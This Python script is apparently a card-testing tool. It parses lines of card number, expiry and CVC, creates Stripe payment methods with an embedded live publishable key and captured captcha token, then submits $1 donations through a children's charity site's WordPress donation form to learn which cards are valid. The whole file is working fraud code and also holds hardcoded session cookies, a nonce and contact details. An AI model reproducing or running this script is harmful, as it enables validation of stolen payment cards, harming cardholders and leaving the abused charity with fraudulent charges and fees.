import time
import requests
from fake_useragent import UserAgent
import random
import re
from bs4 import BeautifulSoup
import base64
import asyncio
from FUNC.defs import *

def fmt(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    yy = ccx.split("|")[1]
    mm = ccx.split("|")[2]
    cc = ccx.split("|")[3]
    
    if "20" in yy:
        yy = yy.split("20")[1]
    
    r = requests.session()
    
    user_agent = UserAgent().random
    
    oa = f'type=card&billing_details[name]=Aohe&billing_details[email]=juligraibdo%40gmail.com&billing_details[address][city]=Windsor&billing_details[address][country]=US&billing_details[address][line1]=Po+box+138&billing_details[address][line2]=Moin+ka&billing_details[address][postal_code]=10009&billing_details[address][state]=New+York&billing_details[phone]=02543612534&card[number]={n}&card[cvc]={cc}&card[exp_month]={yy}&card[exp_year]={mm}&guid=0b9f9c72-344b-449d-844c-08793d8e9330af91f5&muid=faa5929c-3180-4829-9c2f-6afc94ddbdd9bad05b&sid=b9c4055e-9afd-4c83-b93e-91f6abb857eeb8c620&pasted_fields=number&payment_user_agent=stripe.js%2Ffbca98d0bf%3B+stripe-js-v3%2Ffbca98d0bf%3B+card-element&referrer=https%3A%2F%2Fneedhelped.com&time_on_page=20907&key=pk_live_51NKtwILNTDFOlDwVRB3lpHRqBTXxbtZln3LM6TrNdKCYRmUuui6QwNFhDXwjF1FWDhr5BfsPvoCbAKlyP6Hv7ZIz00yKzos8Lr&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiM20yWnFVK0FzMks4cXYybkV4SWxuMHhOYncxYTVoQ3N2bkxJYjh6MGFrTkRaMGJqNFYxUGFtU2lrTlRhVFhQeGo4WDdoNzBNNWVDd09BVkNrSHJZbHBVTlkyZXc0UFA1U2NPVjhFY0l2UWhRdmJzNVFoR3p0bkRjRnR6MWwzNEtIRDdVMGFpdHhaYjFlMHRJaWdPZ2xDTmhYN0w5SjdLZkt0VlBLRXVTcG9CSGE2RlNkN1F3Y2ZpU3NuekIrQXJPSlB1WDMvMnhQRm1TV0VFNURYa1UxMC96dnpnaFl3QlVCbEthYjNUcEc4T3VTKzBvdFp2VWJLMHVkK3cxdVVCSW9FTkhPUkswMnZ2NGhwdzFTSU10TTgwT1lXb0wyendkenhTN2l2aStiYVlrL2hDSFEwd3ZrK3lYdjBMcmdYbllGNk1rZytwQUVRRzBhV1BlbG1FdTRqdE1IWnFhTmZlU0NZUzZUUWE0K0p1UzhsWE9DQWs3Y1BkT3JxL3RXNEtwU1pqQzVZckZlZE1zdmtOMllnb1liUEY4YS9ncldCdkZKNXhMbWZZZ3JsQWsxTXVTelBpNjIyL21tRDYreGNLK2hleGN1Qk81VXllSTlaVDFJNGxFbWZvL1NHa0djTUhsSGxoY2FtUkF4UHN3d3hTNHpwUzVEMTd2aVRKSzAvUFR4ZGM2dDNGZjU5aWZXZDN5djZ0RTNyNzlvU2Zid2FFTkNWZEs1UEFLYmhPcHhaRVkxMGRKaXhvZDNiYnRXTHFQRkVrRUNKTWtvN05HOXE1ZncrTFpyZ2lBZEhaMCt0VklsSHM3Zi8yZmFkSTc3cy9WS1ZJSHk4cE9OSnUvODJpdGxya0gzWk9xeiswQXh5dm02RXdMSVBDTjFHVEtBOFRLcUFya20vengzS3NaQXIxd1U4R1FCblIwL1VidGxHb2R0YWtxNVMvM1ZyZk1YOXdGQzZXMWlXRjZENVVmMnRNZDZSbUtlWDF5bzdBYlpMeU5aZXkvaWNNUTd2NXR4aVNVeTV1V1dsNFdjZ2ExaVRYMlNkalpWcWJkSGtjcHFmVE15cGtjay9xdWtkcnoxY3JFYmlYQmJhMHVDUndRbklxVW1nTlY0VlFpbVFhSVRZbDR3WlBpcXZEOVU3T1dWQmhKWi8wWnl1S0pNR1gwUDFhUDkrQ000NWl2M3A2RGNQTUZwckpvU2cvREYvZXVBa2QycktTeTFSL3RRdWM1SkFoUnlLTitydk8zaUttb2Z0dHVaRGswVlA3Q3BuYTk3RHpraXRUaTRJT0liN09JNVBkeDhQTlA4MFF5UlBxcW5ZemJuUEROcjZZWEJEbUc1WEhmTmpkcWJXWHZEY3VyTFErWXN1T3VUVzAwVjU5ZTZUamZKSGhxc2FSUWtGT0t4cUxtR2liMUFvUjNNaUVDY041Mys1NVRSQmNwZE15c1plaTkvK2VoRFUwTmpqcC9VUXdMRS91blBUejl5MForUWEyeG9xR09iaXV4ZmlRallyNmh5UjgwNXhITnFycEU2TmhxZ01pb29jNTRvU3FURXN3NWdmZmQwN1daRTRCZTNKNHk2MExpdjVGL25WcjJ2OW00NHlhRzVoaHFNcXlnQ0lsbmN5bWdDRGdteS9sTXFTZFN2L3VLREczQjgyU2xGMW4yN0ZIa0FYSUJXMlZJa3JFdnBrRk1Dd1dGUFVMSG1tVk9ZdEVQOEtEb095WnhBUSt5NDBCR2VlbyszakpHMmRPcGVlaGVOejl3MnlxdmlhV0JmSXEya2hMeTVxQ3VXYWJrSjZmZE1yelpaRjJYSnJnbGtQVm9TZWdrRCtYZ0FhcXFkdDdnQ29jalc4OTlxMkRaUStSZVB3cElYVGNFZzRUNXUzNEgyOEtCOXVDRmV3VlpyRHA1eHdpSVlyT0t6bVU3RUNqKzF2blhTVlYrRkVOTkZJczVJTWdSYThYTVRFTFFPQlNJdmVwczJEdXRZK0RRK3ZZTVFibzRxUUh0R1NqZ3VjUUZSZXlsTDVSb2NyclF5eENHR0ljOElrMUhDck5BaUI5ay9XcHREcThpMC91cXBuK2NuRjBic0h5ekxGTzZ0a3FDc01kWGJMRVBOeXVLT3g4cHJmNmNSM21xRmRoTERndktFY0tqeWNvRDgrczk3K05xWGg3aHd5ZmsrT3FGVFJGUVJjb3llMVRVNVAxMHRaY25xN1dteHMzc1BmWnpEVG9wUlAyM2pCYVNIdTNobUcvc0JjQzNCOXF4SWtLc3JsS0RqWXJuaVFFRFh4MVFSaGRTTUd4RzZCa0VlajAzcDVGSGhUamkwQithYk9JbzhKU0liWUN1Q1UvUGhFdFVTRXp6aE1tdjlSQ2M5ekUwbGRYaGpWVzh1TFJpUDBCOTkyWVZteUE5NEMvSlNvcVhaS2NSK0F5bXAveWcwZVlGK3NvR2ROU2VyOXc0QUtmRHhoeEQva2IrQ1puaGJxNEN0TDlCYTJtYm01R3o3ZnJlZGo2SThPUXNHYm02MlpWSlJka3lVVVJZUXFWTzUzTVVzR3h5UTBiYWMvclZBZ1dBOHMyQitRWGh3VGVFNmsxU2VzSkY2blcwWU8xYXJrVU5mQ05jNjd2LytTVXZIQit1SFU5ajQ5Ty9rOEd1QVZuU0NCWXVkS0x6SXFaOGZlSzlMQm1zbDFrSGNqeW4yQ3Qva3FsQjhMM0p5bnBWRXN3aTc1ZTJ6QjA3eklGR0NSRC9vK1d1bm9MQS9IbHY3MTc3TCtkVkhranlTQVRhZldib3dNTW5BZVVLSWtrQzJFNk5LTmFNYTFJN0dLNFdscWhZL0xjK2hiSUlXOUM1a1d4d1pPNGxDTlN6dXFnWW51RmI1MXFDRWRJeTRjK1htbm5nSWpyalowKzFvWFlFcnZCczRPRFlka2h3OHNNaXVJZDdUZHM9IiwiZXhwIjoxNzQyOTAwOTI2LCJzaGFyZF9pZCI6MzYyNDA2OTk2LCJrciI6IjMwNjMxMmFmIiwicGQiOjAsImNkYXRhIjoiUnBMd0pZWUdkMWw1c0l0OUFGcTBPMUtzMlk4eldlZE5vaEE4NXhMdGxKZXorWnJ3UHNUM0dqdHpzdVpkVlR0bU04MnE5SkV5eWdIOEQ2Z256TDQzUjd2VTA3bXdLYWhRcjgyL3NxaU1YaXF2N3NYU280NndWd20zcDFNcFQ1VndiT3VKVUkybjJCaE5wTzl1Q3FVUCtvWGVGZTAvU3RWYmo5RTI4ZWcxc0xDakcyVDFHWWgwVmd0UGdPdVV4RmxCVUt0Z0M4ZDNXVHlOTkNlNiJ9.GP2fwYJgVBgKoY1t7STkIklwOcs79TaYdkhnOwaDXdY'

    response = requests.post('https://api.stripe.com/v1/payment_methods', data=oa)
    
    try:
        id = response.json()['id']
    except:
        return response.json()
                              
    kkie = {
    '_ga': 'GA1.1.1428229976.1742900704',
    'charitable_session': 'ee755de8f2a436a68fe1d3ba5be9c581||86400||82800',
    '__stripe_mid': 'faa5929c-3180-4829-9c2f-6afc94ddbdd9bad05b',
    '__stripe_sid': 'b9c4055e-9afd-4c83-b93e-91f6abb857eeb8c620',
    '_ga_M3WG7TPY0P': 'GS1.1.1742900703.1.1.1742900803.0.0.0',
    '_ga_9S894YGECP': 'GS1.1.1742900703.1.1.1742900807.0.0.0',
}

    rd = {
    'authority': 'needhelped.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://needhelped.com',
    'referer': 'https://needhelped.com/campaigns/poor-children-donation-4/donate/',
    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user_agent,
}

    co = {
    'charitable_form_id': '67e28e42b3739',
    '67e28e42b3739': '',
    '_charitable_donation_nonce': 'c0ea450f6f',
    '_wp_http_referer': '/campaigns/poor-children-donation-4/donate/',
    'campaign_id': '1164',
    'description': 'Poor Children Donation Support',
    'ID': '0',
    'donation_amount': 'custom',
    'custom_donation_amount': '1.00',
    'first_name': 'John',
    'last_name': 'Leo',
    'email': 'juligraibdo@gmail.com',
    'address': 'Po box 138',
    'address_2': 'Moin ka',
    'city': 'Windsor',
    'state': 'New York',
    'postcode': '10009',
    'country': 'US',
    'phone': '02543612534',
    'gateway': 'stripe',
    'stripe_payment_method': id,
    'action': 'make_donation',
    'form_action': 'make_donation',
}

    responsey = requests.post('https://needhelped.com/wp-admin/admin-ajax.php', cookies=kkie, headers=rd, data=co)
    
    try:
        return responsey.json()
    except:
        return 'errorr'
